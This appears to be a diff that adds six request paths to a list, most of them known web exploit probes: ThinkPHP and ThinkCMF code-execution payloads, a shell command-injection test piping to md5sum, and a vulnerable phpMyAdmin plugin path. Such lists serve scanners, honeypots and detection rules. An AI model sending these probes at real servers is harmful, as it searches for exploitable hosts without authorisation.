@@ -1,0 +1,6 @@
+/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
+/index.php
+/index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))}
+/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
+/?a=echo%20-n%20HelloNginx%7Cmd5sum HTTP/1.1
+/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
